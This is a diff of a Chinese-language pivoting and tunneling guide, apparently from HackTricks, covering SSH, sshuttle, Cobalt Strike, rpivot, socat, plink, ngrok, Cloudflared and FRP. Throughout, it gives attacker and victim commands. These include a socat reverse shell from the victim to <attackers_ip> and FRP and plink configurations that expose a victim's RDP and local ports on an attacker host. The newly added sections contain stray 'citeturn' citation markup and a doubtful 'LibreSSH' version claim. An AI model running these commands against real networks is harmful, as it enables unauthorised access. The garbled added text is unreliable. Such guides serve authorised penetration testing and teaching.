@@ -87,10 +87,14 @@ iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
+> [!NOTE]
+> **安全 – Terrapin 攻击 (CVE-2023-48795)**
+> 2023年的Terrapin降级攻击可以让中间人篡改早期的SSH握手并将数据注入到**任何转发通道**（`-L`，`-R`，`-D`）。确保客户端和服务器都已打补丁（**OpenSSH ≥ 9.6/LibreSSH 6.7**），或者在依赖SSH隧道之前明确禁用易受攻击的`chacha20-poly1305@openssh.com`和`*-etm@openssh.com`算法，配置在`sshd_config`/`ssh_config`中。citeturn4search0
+
 ## SSHUTTLE
 
-您可以通过 **ssh** 将所有 **流量** 通过主机 **隧道** 到 **子网络**。\
-例如，转发所有发送到 10.10.10.0/24 的流量。
+您可以通过**ssh**将所有**流量**通过主机**隧道**到**子网络**。\
+例如，转发所有流量到10.10.10.0/24
 ```bash
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
@@ -152,14 +156,14 @@ rportfwd stop [bind port]
 ```
 需要注意：
 
-- Beacon 的反向端口转发旨在 **将流量隧道传输到 Team Server，而不是在单个机器之间中继**。
-- 流量在 **Beacon 的 C2 流量中隧道传输**，包括 P2P 链接。
+- Beacon 的反向端口转发旨在 **将流量隧道传输到团队服务器，而不是在单个机器之间中继**。
+- 流量是 **在 Beacon 的 C2 流量中隧道传输**，包括 P2P 链接。
 - **不需要管理员权限** 来在高端口上创建反向端口转发。
 
 ### rPort2Port 本地
 
 > [!WARNING]
-> 在这种情况下，**端口在 beacon 主机上打开**，而不是在 Team Server 上，**流量发送到 Cobalt Strike 客户端**（而不是 Team Server），然后从那里发送到指定的 host:port。
+> 在这种情况下，**端口是在 beacon 主机上打开的**，而不是在团队服务器上，**流量被发送到 Cobalt Strike 客户端**（而不是团队服务器），然后从那里发送到指定的主机:端口。
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -246,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-通过 **NTLM 代理** 进行枢转
+通过 **NTLM 代理** 进行枢轴
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -272,7 +276,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```bash
 socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```
-### 通过socks的Port2Port
+### Port2Port通过socks
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
@@ -294,7 +298,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 ### SSL Socat Tunnel
 
-**/bin/sh 控制台**
+**/bin/sh console**
 
 在客户端和服务器两侧创建证书：
 ```bash
@@ -322,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 它就像一个控制台版本的 PuTTY（选项与 ssh 客户端非常相似）。
 
-由于这个二进制文件将在受害者的机器上执行，并且它是一个 ssh 客户端，我们需要打开我们的 ssh 服务和端口，以便能够建立反向连接。然后，要将仅本地可访问的端口转发到我们机器上的一个端口：
+由于这个二进制文件将在受害者的机器上执行，并且它是一个 ssh 客户端，我们需要打开我们的 ssh 服务和端口，以便能够建立反向连接。然后，将仅本地可访问的端口转发到我们机器上的一个端口：
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -356,7 +360,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 现在我们可以通过 **RDP** 使用 **`mstsc.exe`** 连接到 **victim**，我们应该收到一个 **prompt**，提示 **SocksOverRDP 插件已启用**，并且它将 **listen** 在 **127.0.0.1:1080**。
 
-通过 **RDP** 连接，并在受害者机器上上传并执行 `SocksOverRDP-Server.exe` 二进制文件：
+通过 **RDP** 连接并在受害者机器上上传并执行 `SocksOverRDP-Server.exe` 二进制文件：
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -392,8 +396,8 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-现在，如果你在受害者的机器上将**SSH**服务设置为监听443端口。你可以通过攻击者的2222端口连接到它。\
-你也可以使用连接到localhost:443的**meterpreter**，而攻击者在2222端口监听。
+现在，如果你在受害者的**SSH**服务上设置监听端口为443。你可以通过攻击者的2222端口连接到它。\
+你也可以使用一个连接到localhost:443的**meterpreter**，而攻击者在2222端口监听。
 
 ## YARP
 
@@ -411,7 +415,7 @@ attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-隧道将会非常慢。您可以通过使用以下命令创建一个压缩的SSH连接：
+隧道将非常慢。您可以通过使用以下命令创建一个压缩的SSH连接：
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -479,7 +483,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-[**ngrok**](https://ngrok.com/) **是一个可以通过一条命令将解决方案暴露到互联网的工具。**\
+[**ngrok**](https://ngrok.com/) **是一个可以通过一条命令行将解决方案暴露到互联网的工具。**\
 _暴露的 URI 类似于:_ **UID.ngrok.io**
 
 ### 安装
@@ -496,7 +500,7 @@ chmod a+x ./ngrok
 
 **文档:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-_如果需要，也可以添加身份验证和 TLS。_
+_如果需要，也可以添加身份验证和TLS。_
 
 #### 隧道 TCP
 ```bash
@@ -541,6 +545,71 @@ httpstatic:
 proto: http
 addr: file:///tmp/httpbin/
 ```
+## Cloudflared (Cloudflare Tunnel)
+
+Cloudflare的 `cloudflared` 守护进程可以创建出站隧道，暴露 **本地 TCP/UDP 服务**，而无需入站防火墙规则，使用Cloudflare的边缘作为会合点。当出站防火墙仅允许HTTPS流量而入站连接被阻止时，这非常方便。
+
+### 快速隧道一行命令
+```bash
+# Expose a local web service listening on 8080
+cloudflared tunnel --url http://localhost:8080
+# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
+```
+### SOCKS5 透传
+```bash
+# Turn the tunnel into a SOCKS5 proxy on port 1080
+cloudflared tunnel --url socks5://localhost:1080 --socks5
+# Now configure proxychains to use 127.0.0.1:1080
+```
+### 使用DNS的持久隧道
+```bash
+cloudflared tunnel create mytunnel
+cloudflared tunnel route dns mytunnel internal.example.com
+# config.yml
+Tunnel: <TUNNEL-UUID>
+credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
+url: http://127.0.0.1:8000
+```
+开始连接器：
+```bash
+cloudflared tunnel run mytunnel
+```
+因为所有流量都通过 **443 端口出站**，Cloudflared 隧道是绕过入口 ACL 或 NAT 边界的简单方法。请注意，二进制文件通常以提升的权限运行 – 尽可能使用容器或 `--user` 标志。 citeturn1search0
+
+## FRP (快速反向代理)
+
+[`frp`](https://github.com/fatedier/frp) 是一个积极维护的 Go 反向代理，支持 **TCP、UDP、HTTP/S、SOCKS 和 P2P NAT 穿透**。从 **v0.53.0（2024年5月）** 开始，它可以充当 **SSH 隧道网关**，因此目标主机可以仅使用标准的 OpenSSH 客户端启动反向隧道 – 无需额外的二进制文件。
+
+### 经典反向 TCP 隧道
+```bash
+# Attacker / server
+./frps -c frps.toml            # listens on 0.0.0.0:7000
+
+# Victim
+./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000
+
+# frpc.toml
+serverAddr = "attacker_ip"
+serverPort = 7000
+
+[[proxies]]
+name       = "rdp"
+type       = "tcp"
+localIP    = "127.0.0.1"
+localPort  = 3389
+remotePort = 5000
+```
+### 使用新的 SSH 网关（无 frpc 二进制文件）
+```bash
+# On frps (attacker)
+sshTunnelGateway.bindPort = 2200   # add to frps.toml
+./frps -c frps.toml
+
+# On victim (OpenSSH client only)
+ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
+```
+上述命令将受害者的端口 **8080** 发布为 **attacker_ip:9000**，无需部署任何额外工具 – 适合利用现有资源进行转发。 citeturn2search1
+
 ## 其他检查工具
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
